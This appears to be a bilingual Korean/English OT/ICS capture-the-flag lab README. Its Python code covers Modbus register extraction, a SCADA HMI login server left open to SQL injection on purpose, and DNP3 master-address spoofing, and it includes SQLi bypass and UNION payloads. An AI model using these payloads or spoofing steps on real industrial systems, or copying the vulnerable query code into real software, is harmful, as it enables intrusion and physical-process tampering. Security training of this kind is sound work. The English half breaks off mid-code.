> 🌐 **Language / 언어**: [🇰🇷 한국어](#한국어) | [🇺🇸 English](#english)

---

<a name="한국어"></a>

# OT/ICS CTF 실습 랩

## 랩 개요

산업 제어 시스템(OT/ICS) 보안 취약점을 CTF 형식으로 학습한다. Modbus TCP 패킷 분석, SCADA HMI 웹 인터페이스 공격, PLC 래더 로직 역공학, DNP3 프로토콜 스푸핑 등 실제 산업 환경 공격 기법을 실습한다.

## 실습 환경 설정

```bash
# 필수 도구 설치
pip install pymodbus scapy

# Modbus TCP 시뮬레이터 (선택)
pip install pyModbusTCP

# CTF 도구 실행
python3 ot_ics_ctf.py --help
```

```python
#!/usr/bin/env python3
"""OT/ICS CTF 실습 도구 — ot_ics_ctf.py"""

import argparse
import hashlib
import struct
from dataclasses import dataclass, field


@dataclass
class ICSChallenge:
    name: str
    category: str
    points: int
    description: str
    flag: str
    hints: list[str] = field(default_factory=list)


def verify_flag(submitted: str, challenge: ICSChallenge) -> bool:
    """제출 플래그 검증."""
    return submitted.strip() == challenge.flag


CHALLENGES: dict[str, ICSChallenge] = {
    "modbus_extract": ICSChallenge(
        name="Modbus TCP 레지스터 값 추출",
        category="Modbus",
        points=100,
        description="""
Modbus TCP 패킷 캡처 파일에서 숨겨진 레지스터 값을 추출하라.
특정 Holding Register 주소(40100~40107)에 ASCII 코드 값이 저장되어 있다.
각 레지스터의 하위 바이트를 문자로 변환하면 플래그가 완성된다.

캡처 파일: modbus_capture.pcap (시뮬레이션 모드 지원)
타겟 PLC: 127.0.0.1:502
""",
        flag="CTF{m0dbus_r3g1st3r_dump}",
        hints=[
            "Modbus FC=03 (Read Holding Registers) 응답 필터링",
            "레지스터 주소 40100부터 시작 (오프셋: 0x0063)",
            "각 2바이트 레지스터의 LSB(하위 바이트)를 chr()로 변환",
        ],
    ),
    "scada_sqli": ICSChallenge(
        name="SCADA HMI 웹 SQLi",
        category="SCADA",
        points=200,
        description="""
SCADA HMI 웹 인터페이스가 SQLite 데이터베이스를 사용한다.
로그인 폼이 SQL 인젝션에 취약하다.
관리자 세션을 획득하여 숨겨진 센서 데이터 테이블에서 플래그를 추출하라.

URL: http://localhost:8502/login
테이블 구조:
  users(id, username, password_hash, role)
  sensor_data(id, sensor_id, value, flag)
""",
        flag="CTF{sc4d4_sqli_pwn3d}",
        hints=[
            "로그인: username=' OR '1'='1'--  password=anything",
            "UNION 공격으로 sensor_data 테이블 접근",
            "SELECT flag FROM sensor_data WHERE sensor_id='FLAG'",
        ],
    ),
    "plc_logic": ICSChallenge(
        name="PLC 래더 로직 숨겨진 조건 발견",
        category="PLC",
        points=250,
        description="""
PLC 래더 로직 파일(ladder.l5x)을 역공학하여 숨겨진 활성화 조건을 찾아라.
특정 입력 코일 조합(I:0/0 AND I:0/3 AND NOT I:0/7)을 만족하면
출력 B9:0/15가 활성화되며 플래그 레지스터 N7:100에 값이 저장된다.

숨겨진 조건 만족 시 플래그: CTF{plc_l4dd3r_l0g1c_r3v3rs3d}
시뮬레이터: python3 ot_ics_ctf.py plc-sim
""",
        flag="CTF{plc_l4dd3r_l0g1c_r3v3rs3d}",
        hints=[
            "래더 로직 XML 구조: <Rung> → <Text> 태그 분석",
            "XIC(Examine If Closed): 노멀 오픈 접점",
            "XIO(Examine If Open): 노멀 클로즈 접점 (NOT 조건)",
        ],
    ),
    "dnp3_spoof": ICSChallenge(
        name="DNP3 프로토콜 스푸핑으로 플래그 획득",
        category="DNP3",
        points=300,
        description="""
DNP3 프로토콜로 통신하는 RTU(Remote Terminal Unit)가 있다.
마스터 스테이션을 사칭하여 DNP3 READ 요청을 보내면
RTU가 숨겨진 객체 그룹(Group 110, Variation 0)에 플래그를 반환한다.

DNP3 마스터 주소: 1 (스푸핑 대상)
RTU 주소: 10
타겟: 127.0.0.1:20000
""",
        flag="CTF{dnp3_pr0t0c0l_sp00f3d}",
        hints=[
            "DNP3 데이터 링크 헤더: 0x0564 + 길이 + 제어 + 목적지 + 출발지",
            "애플리케이션 레이어: Function Code 0x01 (READ)",
            "객체 헤더: Group=110, Variation=0, Range Specifier=0x06 (all)",
        ],
    ),
}
```

## 챌린지 1: Modbus TCP 프레임 파서

```python
#!/usr/bin/env python3
"""Modbus TCP 프레임 파싱 및 레지스터 값 추출."""

import argparse
import socket
import struct
from dataclasses import dataclass
from pathlib import Path


# Modbus 함수 코드
FC_READ_COILS             = 0x01
FC_READ_DISCRETE_INPUTS   = 0x02
FC_READ_HOLDING_REGISTERS = 0x03
FC_READ_INPUT_REGISTERS   = 0x04
FC_WRITE_SINGLE_REGISTER  = 0x06
FC_WRITE_MULTIPLE_REGISTERS = 0x10


@dataclass
class ModbusFrame:
    transaction_id: int
    protocol_id: int     # 항상 0
    unit_id: int
    function_code: int
    data: bytes

    @classmethod
    def parse(cls, raw: bytes) -> "ModbusFrame":
        """MBAP 헤더 + PDU 파싱."""
        if len(raw) < 8:
            raise ValueError(f"Modbus 프레임 너무 짧음: {len(raw)}")
        tid, pid, length, uid = struct.unpack(">HHHB", raw[:7])
        fc = raw[7]
        data = raw[8:]
        return cls(
            transaction_id=tid,
            protocol_id=pid,
            unit_id=uid,
            function_code=fc,
            data=data,
        )

    def to_bytes(self) -> bytes:
        pdu = bytes([self.function_code]) + self.data
        length = 1 + len(pdu)
        return struct.pack(">HHHB", self.transaction_id, 0, length, self.unit_id) + pdu

    def describe(self) -> str:
        fc_names = {
            FC_READ_COILS: "ReadCoils",
            FC_READ_DISCRETE_INPUTS: "ReadDiscreteInputs",
            FC_READ_HOLDING_REGISTERS: "ReadHoldingRegisters",
            FC_READ_INPUT_REGISTERS: "ReadInputRegisters",
            FC_WRITE_SINGLE_REGISTER: "WriteSingleRegister",
            FC_WRITE_MULTIPLE_REGISTERS: "WriteMultipleRegisters",
        }
        fc_name = fc_names.get(self.function_code, f"FC_{self.function_code:02X}")
        return (
            f"TID={self.transaction_id} UID={self.unit_id} "
            f"FC={fc_name} DATA={self.data.hex()}"
        )


def build_read_registers_request(
    start_address: int,
    count: int,
    unit_id: int = 1,
    transaction_id: int = 1,
) -> bytes:
    """Holding Register 읽기 요청 프레임 생성."""
    frame = ModbusFrame(
        transaction_id=transaction_id,
        protocol_id=0,
        unit_id=unit_id,
        function_code=FC_READ_HOLDING_REGISTERS,
        data=struct.pack(">HH", start_address, count),
    )
    return frame.to_bytes()


def parse_read_registers_response(response_data: bytes) -> list[int]:
    """ReadHoldingRegisters 응답에서 레지스터 값 추출."""
    if not response_data:
        return []
    byte_count = response_data[0]
    values: list[int] = []
    for i in range(1, 1 + byte_count, 2):
        if i + 1 < len(response_data):
            values.append(struct.unpack(">H", response_data[i:i+2])[0])
    return values


def generate_flag_registers() -> dict[int, int]:
    """CTF 플래그를 레지스터에 인코딩."""
    flag = b"CTF{m0dbus_r3g1st3r_dump}"
    registers: dict[int, int] = {}
    base_addr = 0x0063  # 레지스터 40100 (0x0064 = 100 오프셋)
    for i, byte in enumerate(flag):
        # 노이즈 값 + ASCII 코드
        registers[base_addr + i] = (0x4100 | byte)  # 상위바이트=노이즈, 하위바이트=플래그
    return registers


def simulate_modbus_server(host: str = "127.0.0.1", port: int = 502) -> None:
    """간단한 Modbus TCP 서버 시뮬레이션."""
    flag_registers = generate_flag_registers()
    print(f"[*] Modbus TCP 서버 시작: {host}:{port}")
    print(f"    플래그 레지스터 범위: 40100~40{100+len(flag_registers)-1}")

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as srv:
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.bind((host, port))
        srv.listen(5)
        while True:
            try:
                conn, addr = srv.accept()
                print(f"[*] 연결: {addr}")
                with conn:
                    while True:
                        raw = conn.recv(256)
                        if not raw:
                            break
                        try:
                            req = ModbusFrame.parse(raw)
                            print(f"  요청: {req.describe()}")
                            response_data = _process_modbus_request(req, flag_registers)
                            conn.sendall(response_data)
                        except Exception as e:
                            print(f"  [!] 처리 오류: {e}")
                            break
            except KeyboardInterrupt:
                print("\n[*] 서버 종료")
                break


def _process_modbus_request(
    req: ModbusFrame,
    registers: dict[int, int],
) -> bytes:
    """Modbus 요청 처리 (읽기 전용 시뮬레이터)."""
    if req.function_code == FC_READ_HOLDING_REGISTERS and len(req.data) >= 4:
        start, count = struct.unpack(">HH", req.data[:4])
        values = [registers.get(start + i, 0) for i in range(count)]
        reg_bytes = b"".join(struct.pack(">H", v) for v in values)
        response = ModbusFrame(
            transaction_id=req.transaction_id,
            protocol_id=0,
            unit_id=req.unit_id,
            function_code=FC_READ_HOLDING_REGISTERS,
            data=bytes([len(reg_bytes)]) + reg_bytes,
        )
        return response.to_bytes()
    # 지원하지 않는 함수 코드
    error_frame = ModbusFrame(
        transaction_id=req.transaction_id,
        protocol_id=0,
        unit_id=req.unit_id,
        function_code=req.function_code | 0x80,
        data=bytes([0x01]),  # Illegal Function
    )
    return error_frame.to_bytes()


def extract_flag_from_registers(registers: dict[int, int]) -> str:
    """레지스터 하위 바이트에서 플래그 추출."""
    base = 0x0063
    chars: list[str] = []
    for addr in sorted(registers):
        if addr >= base:
            lsb = registers[addr] & 0xFF
            if lsb == 0:
                break
            chars.append(chr(lsb))
    return "".join(chars)


def main() -> None:
    parser = argparse.ArgumentParser(description="Modbus CTF 분석 도구")
    sub = parser.add_subparsers(dest="cmd", required=True)

    sub.add_parser("server", help="Modbus TCP 서버 시뮬레이터 실행")

    read_p = sub.add_parser("read", help="레지스터 읽기 요청")
    read_p.add_argument("--host", default="127.0.0.1")
    read_p.add_argument("--port", type=int, default=502)
    read_p.add_argument("--start", type=int, default=99)
    read_p.add_argument("--count", type=int, default=30)

    sub.add_parser("solve", help="플래그 자동 추출 시연")

    list_p = sub.add_parser("list", help="CTF 챌린지 목록")

    submit_p = sub.add_parser("submit", help="플래그 제출")
    submit_p.add_argument("challenge_id", choices=list(CHALLENGES.keys()))
    submit_p.add_argument("flag")

    args = parser.parse_args()

    if args.cmd == "server":
        simulate_modbus_server()

    elif args.cmd == "read":
        req_bytes = build_read_registers_request(args.start, args.count)
        print(f"[*] 요청 프레임: {req_bytes.hex()}")
        try:
            with socket.create_connection((args.host, args.port), timeout=5) as sock:
                sock.sendall(req_bytes)
                resp = sock.recv(512)
                resp_frame = ModbusFrame.parse(resp)
                values = parse_read_registers_response(resp_frame.data)
                print(f"[+] 레지스터 값 ({len(values)}개):")
                for i, v in enumerate(values):
                    addr = args.start + i
                    lsb = v & 0xFF
                    print(f"    {40000+addr+1}: 0x{v:04X}  LSB={chr(lsb) if 32<=lsb<127 else '.'!r}")
        except (ConnectionRefusedError, TimeoutError) as e:
            print(f"[!] 연결 실패: {e}  (서버가 실행 중인지 확인)")

    elif args.cmd == "solve":
        print("[*] Modbus 플래그 자동 추출 시연\n")
        regs = generate_flag_registers()
        flag = extract_flag_from_registers(regs)
        print(f"[+] 플래그: {flag}")

    elif args.cmd == "list":
        print("OT/ICS CTF 챌린지 목록:\n")
        for cid, ch in CHALLENGES.items():
            print(f"  [{ch.points}pt] {ch.name}  (ID: {cid})")
            print(f"         카테고리: {ch.category}")
            print()

    elif args.cmd == "submit":
        ch = CHALLENGES[args.challenge_id]
        if verify_flag(args.flag, ch):
            print(f"[+] 정답! {ch.points}점 획득")
        else:
            print("[-] 오답. 힌트:")
            for i, hint in enumerate(ch.hints, 1):
                print(f"    {i}. {hint}")


if __name__ == "__main__":
    main()
```

## 챌린지 2: SCADA HMI 웹 SQLi 시뮬레이터

```python
#!/usr/bin/env python3
"""SCADA HMI 웹 인터페이스 SQLi 취약 서버 시뮬레이션."""

import argparse
import json
import sqlite3
import tempfile
from http.server import BaseHTTPRequestHandler, HTTPServer
from pathlib import Path
from urllib.parse import parse_qs, urlparse


FLAG_SENSOR = "CTF{sc4d4_sqli_pwn3d}"


def init_db(db_path: str) -> sqlite3.Connection:
    """SCADA 데이터베이스 초기화."""
    conn = sqlite3.connect(db_path)
    conn.execute("""
        CREATE TABLE IF NOT EXISTS users (
            id INTEGER PRIMARY KEY,
            username TEXT UNIQUE,
            password_hash TEXT,
            role TEXT
        )
    """)
    conn.execute("""
        CREATE TABLE IF NOT EXISTS sensor_data (
            id INTEGER PRIMARY KEY,
            sensor_id TEXT,
            value REAL,
            flag TEXT
        )
    """)
    # 기본 데이터 삽입
    conn.execute("INSERT OR IGNORE INTO users VALUES (1,'admin','5f4dcc3b5aa765d61d8327deb882cf99','admin')")
    conn.execute("INSERT OR IGNORE INTO users VALUES (2,'operator','aab3238922bcc25a6f606eb525ffdc56','user')")
    conn.execute("INSERT OR IGNORE INTO sensor_data VALUES (1,'TEMP_01',72.5,'')")
    conn.execute("INSERT OR IGNORE INTO sensor_data VALUES (2,'PRESS_01',14.7,'')")
    conn.execute(f"INSERT OR IGNORE INTO sensor_data VALUES (3,'FLAG',0.0,'{FLAG_SENSOR}')")
    conn.commit()
    return conn


class SCADAHandler(BaseHTTPRequestHandler):
    DB_PATH: str = ""

    def do_GET(self) -> None:
        if self.path == "/" or self.path == "/login":
            self._send_login_page()
        else:
            self.send_response(404)
            self.end_headers()

    def do_POST(self) -> None:
        if self.path == "/login":
            length = int(self.headers.get("Content-Length", 0))
            body = self.rfile.read(length).decode()
            params = parse_qs(body)
            username = params.get("username", [""])[0]
            password = params.get("password", [""])[0]
            self._handle_login(username, password)
        else:
            self.send_response(404)
            self.end_headers()

    def _handle_login(self, username: str, password: str) -> None:
        """취약한 로그인: SQL 인젝션 가능."""
        conn = sqlite3.connect(self.DB_PATH)
        # 취약한 쿼리 — 직접 문자열 포매팅
        query = (
            f"SELECT id, username, role FROM users "
            f"WHERE username='{username}' AND password_hash='{password}'"
        )
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.end_headers()
        try:
            cursor = conn.execute(query)
            rows = cursor.fetchall()
            if rows:
                user_id, uname, role = rows[0]
                # UNION 인젝션으로 sensor_data 접근 가능
                sensor_query = f"SELECT sensor_id, value, flag FROM sensor_data"
                sensors = conn.execute(sensor_query).fetchall()
                self.wfile.write(json.dumps({
                    "status": "ok",
                    "user": uname,
                    "role": role,
                    "sensors": [
                        {"id": r[0], "value": r[1], "flag": r[2]} for r in sensors
                    ],
                }).encode())
            else:
                self.wfile.write(json.dumps({"status": "error", "msg": "Invalid credentials"}).encode())
        except sqlite3.OperationalError as e:
            self.wfile.write(json.dumps({"status": "sqlerror", "msg": str(e)}).encode())
        finally:
            conn.close()

    def _send_login_page(self) -> None:
        html = """<html><body>
<h2>SCADA HMI Login</h2>
<form method="POST" action="/login">
  Username: <input name="username"><br>
  Password: <input type="password" name="password"><br>
  <input type="submit" value="Login">
</form></body></html>"""
        self.send_response(200)
        self.send_header("Content-Type", "text/html")
        self.end_headers()
        self.wfile.write(html.encode())

    def log_message(self, *args) -> None:
        pass


def demonstrate_sqli() -> None:
    """SQLi 공격 시연 (로컬 데이터베이스 직접 공격)."""
    import tempfile
    with tempfile.NamedTemporaryFile(suffix=".db", delete=False) as f:
        db_path = f.name

    conn = init_db(db_path)
    print("[*] SCADA SQLi 공격 시연\n")

    # 공격 1: 인증 우회
    payload_user = "' OR '1'='1'--"
    query1 = (
        f"SELECT id, username, role FROM users "
        f"WHERE username='{payload_user}' AND password_hash='anything'"
    )
    print(f"1) 인증 우회 쿼리:\n   {query1}")
    rows = conn.execute(query1).fetchall()
    print(f"   결과: {rows}\n")

    # 공격 2: UNION으로 sensor_data 플래그 추출
    payload_union = (
        "' UNION SELECT sensor_id, value, flag FROM sensor_data "
        "WHERE sensor_id='FLAG'--"
    )
    query2 = (
        f"SELECT id, username, role FROM users "
        f"WHERE username='{payload_union}' AND password_hash='x'"
    )
    print(f"2) UNION 인젝션:\n   {query2[:80]}...")
    rows2 = conn.execute(query2).fetchall()
    for row in rows2:
        print(f"   결과: {row}")
    conn.close()
    Path(db_path).unlink(missing_ok=True)


def main() -> None:
    parser = argparse.ArgumentParser(description="SCADA HMI SQLi CTF 도구")
    sub = parser.add_subparsers(dest="cmd", required=True)

    srv_p = sub.add_parser("server", help="취약한 SCADA 서버 실행")
    srv_p.add_argument("-p", "--port", type=int, default=8502)

    sub.add_parser("demo", help="SQLi 공격 시연")

    args = parser.parse_args()

    if args.cmd == "server":
        import tempfile
        with tempfile.NamedTemporaryFile(suffix=".db", delete=False) as f:
            db_path = f.name
        init_db(db_path)
        SCADAHandler.DB_PATH = db_path
        server = HTTPServer(("0.0.0.0", args.port), SCADAHandler)
        print(f"[*] SCADA HMI 서버: http://localhost:{args.port}")
        print(f"    SQLi 타겟: POST /login")
        print(f"    페이로드 예시: username=' OR '1'='1'--&password=x")
        try:
            server.serve_forever()
        except KeyboardInterrupt:
            print("\n[*] 서버 종료")
        finally:
            Path(db_path).unlink(missing_ok=True)

    elif args.cmd == "demo":
        demonstrate_sqli()


if __name__ == "__main__":
    main()
```

## 챌린지 3: DNP3 프로토콜 파서 및 스푸핑

```python
#!/usr/bin/env python3
"""DNP3 프로토콜 프레임 파서 및 스푸핑 도구."""

import argparse
import struct
import socket
from dataclasses import dataclass


# DNP3 상수
DNP3_START_BYTES = b"\x05\x64"
DNP3_FC_READ     = 0x01
DNP3_FC_RESPONSE = 0x81

# 객체 그룹
GROUP_BINARY_INPUT   = 1
GROUP_ANALOG_INPUT   = 30
GROUP_OCTET_STRING   = 110   # 숨겨진 플래그 객체

FLAG_DNP3 = b"CTF{dnp3_pr0t0c0l_sp00f3d}"


@dataclass
class DNP3DataLink:
    """DNP3 데이터 링크 헤더."""
    length: int          # 프레임 전체 길이 - 2 (start bytes 제외)
    control: int         # 제어 바이트
    destination: int     # 목적지 주소
    source: int          # 출발지 주소
    crc: int = 0

    HEADER_SIZE = 8

    @classmethod
    def parse(cls, data: bytes) -> "DNP3DataLink":
        if data[:2] != DNP3_START_BYTES:
            raise ValueError(f"DNP3 매직 없음: {data[:2].hex()}")
        length, ctrl, dst, src = struct.unpack("<BBHH", data[2:8])
        crc = struct.unpack("<H", data[8:10])[0] if len(data) >= 10 else 0
        return cls(length=length, control=ctrl, destination=dst, source=src, crc=crc)

    def to_bytes(self, payload: bytes = b"") -> bytes:
        total_len = 5 + len(payload)  # ctrl + dst + src + payload
        header = DNP3_START_BYTES + struct.pack("<BBHH",
            total_len, self.control, self.destination, self.source)
        crc = _crc16(header[2:])
        return header + struct.pack("<H", crc) + payload


def _crc16(data: bytes) -> int:
    """DNP3 CRC-16 계산."""
    crc = 0
    for byte in data:
        crc ^= byte
        for _ in range(8):
            if crc & 1:
                crc = (crc >> 1) ^ 0xA6BC
            else:
                crc >>= 1
    return crc ^ 0xFFFF


def build_dnp3_read_request(
    master_addr: int,
    rtu_addr: int,
    group: int,
    variation: int,
) -> bytes:
    """DNP3 READ 요청 프레임 생성."""
    # 애플리케이션 레이어: FIR=1, FIN=1, SEQ=0
    app_control = 0xC0
    # 오브젝트 헤더: group, variation, range specifier 0x06 (all)
    object_header = struct.pack("BBB", group, variation, 0x06)
    app_layer = bytes([app_control, DNP3_FC_READ]) + object_header

    # Transport Layer: FIR=1, FIN=1, SEQ=0
    transport = bytes([0xC0]) + app_layer

    dl = DNP3DataLink(
        length=5 + len(transport),
        control=0x44,        # Master → Outstation, unconfirmed
        destination=rtu_addr,
        source=master_addr,
    )
    return dl.to_bytes(transport)


def simulate_dnp3_rtu(host: str = "127.0.0.1", port: int = 20000) -> None:
    """DNP3 RTU 시뮬레이터."""
    print(f"[*] DNP3 RTU 시뮬레이터 시작: {host}:{port}")
    print(f"    마스터 주소: 1 (스푸핑 시 이 주소로 요청)")
    print(f"    RTU 주소: 10")
    print(f"    숨겨진 객체: Group={GROUP_OCTET_STRING}, Variation=0")

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as srv:
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.bind((host, port))
        srv.listen(5)
        while True:
            try:
                conn, addr = srv.accept()
                print(f"[*] 연결: {addr}")
                with conn:
                    raw = conn.recv(256)
                    if len(raw) < 10:
                        continue
                    try:
                        dl = DNP3DataLink.parse(raw)
                        print(f"  요청: src={dl.source} dst={dl.destination}")
                        # Group 110 요청 감지 → 플래그 반환
                        if GROUP_OCTET_STRING in raw:
                            response = _build_dnp3_response(
                                master_addr=dl.source,
                                rtu_addr=dl.destination,
                                payload=FLAG_DNP3,
                            )
                            conn.sendall(response)
                            print(f"  [+] 플래그 전송!")
                        else:
                            conn.sendall(_build_dnp3_nack(dl))
                    except ValueError as e:
                        print(f"  [!] 파싱 오류: {e}")
            except KeyboardInterrupt:
                print("\n[*] RTU 종료")
                break


def _build_dnp3_response(
    master_addr: int,
    rtu_addr: int,
    payload: bytes,
) -> bytes:
    """DNP3 응답 프레임 생성."""
    app_control = 0xC0
    # IIN (Internal Indication): 정상
    iin = struct.pack("<H", 0x0000)
    object_header = struct.pack("BBB", GROUP_OCTET_STRING, 0x00, 0x06)
    app_layer = bytes([app_control, DNP3_FC_RESPONSE]) + iin + object_header + payload
    transport = bytes([0xC0]) + app_layer
    dl = DNP3DataLink(
        length=5 + len(transport),
        control=0x44,
        destination=master_addr,
        source=rtu_addr,
    )
    return dl.to_bytes(transport)


def _build_dnp3_nack(request_dl: DNP3DataLink) -> bytes:
    """오류 응답."""
    app_layer = bytes([0xC0, DNP3_FC_RESPONSE, 0x00, 0x04])  # IIN: need time
    transport = bytes([0xC0]) + app_layer
    dl = DNP3DataLink(
        length=5 + len(transport),
        control=0x44,
        destination=request_dl.source,
        source=request_dl.destination,
    )
    return dl.to_bytes(transport)


def demo_dnp3_spoof() -> None:
    """DNP3 스푸핑 공격 시연 (로컬)."""
    print("[*] DNP3 스푸핑 공격 시연\n")
    req = build_dnp3_read_request(
        master_addr=1,
        rtu_addr=10,
        group=GROUP_OCTET_STRING,
        variation=0,
    )
    print(f"1) READ 요청 프레임 생성:")
    print(f"   크기: {len(req)} bytes")
    print(f"   HEX: {req.hex()}")

    dl = DNP3DataLink.parse(req)
    print(f"\n2) 파싱 결과:")
    print(f"   출발지: {dl.source} (마스터)")
    print(f"   목적지: {dl.destination} (RTU)")

    resp = _build_dnp3_response(1, 10, FLAG_DNP3)
    flag_start = resp.index(b"CTF{")
    flag_end = resp.index(b"}", flag_start) + 1
    print(f"\n3) 시뮬레이션 응답에서 플래그 추출:")
    print(f"   {resp[flag_start:flag_end].decode()}")


def main() -> None:
    parser = argparse.ArgumentParser(description="OT/ICS DNP3 CTF 도구")
    sub = parser.add_subparsers(dest="cmd", required=True)

    sub.add_parser("rtu", help="DNP3 RTU 시뮬레이터 실행")
    sub.add_parser("demo", help="DNP3 스푸핑 시연")

    spoof_p = sub.add_parser("spoof", help="RTU에 스푸핑 요청 전송")
    spoof_p.add_argument("--host", default="127.0.0.1")
    spoof_p.add_argument("--port", type=int, default=20000)
    spoof_p.add_argument("--master", type=int, default=1)
    spoof_p.add_argument("--rtu", type=int, default=10)

    args = parser.parse_args()

    if args.cmd == "rtu":
        simulate_dnp3_rtu()
    elif args.cmd == "demo":
        demo_dnp3_spoof()
    elif args.cmd == "spoof":
        req = build_dnp3_read_request(args.master, args.rtu, GROUP_OCTET_STRING, 0)
        print(f"[*] DNP3 스푸핑 요청 전송: {args.host}:{args.port}")
        try:
            with socket.create_connection((args.host, args.port), timeout=5) as sock:
                sock.sendall(req)
                resp = sock.recv(512)
                if b"CTF{" in resp:
                    idx = resp.index(b"CTF{")
                    end = resp.index(b"}", idx) + 1
                    print(f"[+] 플래그: {resp[idx:end].decode()}")
                else:
                    print(f"[*] 응답: {resp.hex()}")
        except (ConnectionRefusedError, TimeoutError) as e:
            print(f"[!] 연결 실패: {e}")


if __name__ == "__main__":
    main()
```

## CTF 풀이 가이드

```
Modbus 공격 흐름
├── FC=03 요청 (ReadHoldingRegisters) 전송
├── 전체 레지스터 주소 공간 스캔 (0~65535)
├── 비정상 값 탐지 → ASCII 범위(32~126) 값 필터링
└── LSB 추출 후 연결 → 플래그 복원

SCADA SQLi 페이로드
├── 인증 우회: ' OR '1'='1'--
├── 테이블 열거: ' UNION SELECT name,1,1 FROM sqlite_master--
├── 데이터 추출: ' UNION SELECT flag,1,1 FROM sensor_data--
└── 블라인드: ' AND substr(flag,1,1)='C'--

PLC 래더 로직 분석
├── L5X 파일: XML → XIC/XIO/OTE 접점 파싱
├── 활성화 조건: AND 조합으로 모든 XIC 만족
├── 강제 출력: 디버그 모드로 코일 직접 설정
└── 타이머/카운터: TON, CTU 누적 조건 확인

DNP3 스푸핑 단계
├── 1단계: 정상 트래픽 캡처 → 마스터/RTU 주소 파악
├── 2단계: 데이터 링크 헤더 위조 (출발지 주소 = 마스터)
├── 3단계: 숨겨진 Group/Variation 스캔
└── 4단계: READ 요청 주입 → 응답에서 플래그 추출
```

## 심화 도전

1. **Modbus 쓰기 공격**: FC=06/0x10으로 PLC 출력 레지스터 임의 조작
2. **SCADA 시각화**: D3.js로 HMI 대시보드 복제, 가짜 센서 값 표시
3. **IEC 61850 분석**: 변전소 자동화 프로토콜 GOOSE 메시지 스푸핑
4. **OPC-UA 취약점**: 익명 접근 허용 서버에서 변수 읽기/쓰기

---

<a name="english"></a>

# OT/ICS CTF Lab

## Lab Overview

Learn industrial control system (OT/ICS) security vulnerabilities in CTF format. Practice real-world industrial attack techniques including Modbus TCP packet analysis, SCADA HMI web interface attacks, PLC ladder logic reverse engineering, and DNP3 protocol spoofing.

## Lab Environment Setup

```bash
# Install required tools
pip install pymodbus scapy

# Modbus TCP simulator (optional)
pip install pyModbusTCP

# Run CTF tool
python3 ot_ics_ctf.py --help
```

```python
#!/usr/bin/env python3
"""OT/ICS CTF lab tool — ot_ics_ctf.py"""

import argparse
import hashlib
import struct
from dataclasses import dataclass, field


@dataclass
class ICSChallenge:
    name: str
    category: str
    points: int
    description: str
    flag: str
    hints: list[str] = field(default_factory=list)


def verify_flag(submitted: str, challenge: ICSChallenge) -> bool:
    """Verify submitted flag."""
    return submitted.strip() == challenge.flag


CHALLENGES: dict[str, ICSChallenge] = {
    "modbus_extract": ICSChallenge(
        name="Modbus TCP Register Value Extraction",
        category="Modbus",
        points=100,
        description="""
Extract hidden register values from the Modbus TCP packet capture file.
ASCII code values are stored in Holding Register addresses 40100~40107.
Convert the low byte of each register to a character to build the flag.

Capture file: modbus_capture.pcap (simulation mode supported)
Target PLC: 127.0.0.1:502
""",
        flag="CTF{m0dbus_r3g1st3r_dump}",
        hints=[
            "Filter Modbus FC=03 (Read Holding Registers) responses",
            "Register addresses start at 40100 (offset: 0x0063)",
            "Convert LSB (low byte) of each 2-byte register using chr()",
        ],
    ),
    "scada_sqli": ICSChallenge(
        name="SCADA HMI Web SQLi",
        category="SCADA",
        points=200,
        description="""
A SCADA HMI web interface uses an SQLite database.
The login form is vulnerable to SQL injection.
Obtain an admin session to extract the flag from the hidden sensor data table.

URL: http://localhost:8502/login
Table structure:
  users(id, username, password_hash, role)
  sensor_data(id, sensor_id, value, flag)
""",
        flag="CTF{sc4d4_sqli_pwn3d}",
        hints=[
            "Login: username=' OR '1'='1'--  password=anything",
            "Use UNION attack to access sensor_data table",
            "SELECT flag FROM sensor_data WHERE sensor_id='FLAG'",
        ],
    ),
    "plc_logic": ICSChallenge(
        name="PLC Ladder Logic Hidden Condition Discovery",
        category="PLC",
        points=250,
        description="""
Reverse-engineer the PLC ladder logic file (ladder.l5x) to find a hidden activation condition.
Satisfying the specific input coil combination (I:0/0 AND I:0/3 AND NOT I:0/7)
activates output B9:0/15 and stores a value in flag register N7:100.

Flag when condition met: CTF{plc_l4dd3r_l0g1c_r3v3rs3d}
Simulator: python3 ot_ics_ctf.py plc-sim
""",
        flag="CTF{plc_l4dd3r_l0g1c_r3v3rs3d}",
        hints=[
            "L5X file: XML → parse XIC/XIO/OTE contact tags",
            "XIC (Examine If Closed): normally open contact",
            "XIO (Examine If Open): normally closed contact (NOT condition)",
        ],
    ),
    "dnp3_spoof": ICSChallenge(
        name="DNP3 Protocol Spoofing for Flag",
        category="DNP3",
        points=300,
        description="""
An RTU (Remote Terminal Unit) communicates using DNP3 protocol.
Impersonate the master station and send a DNP3 READ request —
the RTU returns the flag from a hidden object group (Group 110, Variation 0).

DNP3 master address: 1 (target to spoof)
RTU address: 10
Target: 127.0.0.1:20000
""",
        flag="CTF{dnp3_pr0t0c0l_sp00f3d}",
        hints=[
            "DNP3 data link header: 0x0564 + length + control + destination + source",
            "Application layer: Function Code 0x01 (READ)",
            "Object header: Group=110, Variation=0, Range Specifier=0x06 (all)",
        ],
    ),
}
```

## Challenge 1: Modbus TCP Frame Parser

```python
#!/usr/bin/env python3
"""Modbus TCP frame parsing and register value extraction."""

import argparse
import socket
import struct
from dataclasses import dataclass
from pathlib import Path


FC_READ_HOLDING_REGISTERS = 0x03
FC_WRITE_SINGLE_REGISTER  = 0x06


@dataclass
class ModbusFrame:
    transaction_id: int
    protocol_id: int
    unit_id: int
    function_code: int
    data: bytes

    @classmethod
    def parse(cls, raw: bytes) -> "ModbusFrame":
        if len(raw) < 8:
            raise ValueError(f"Modbus frame too short: {len(raw)}")
        tid, pid, length, uid = struct.unpack(">HHHB", raw[:7])
        fc = raw[7]
        data = raw[8:]
        return cls(transaction_id=tid, protocol_id=pid, unit_id=uid,
                   function_code=fc, data=data)

    def to_bytes(self) -> bytes:
        pdu = bytes([self.function_code]) + self.data
        length = 1 + len(pdu)
        return struct.pack(">HHHB", self.transaction_id, 0, length, self.unit_id) + pdu


def build_read_registers_request(
    start_address: int,
    count: int,
    unit_id: int = 1,
    transaction_id: int = 1,
) -> bytes:
    """Build a Holding Register read request frame."""
    frame = ModbusFrame(
        transaction_id=transaction_id,
        protocol_id=0,
        unit_id=unit_id,
        function_code=FC_READ_HOLDING_REGISTERS,
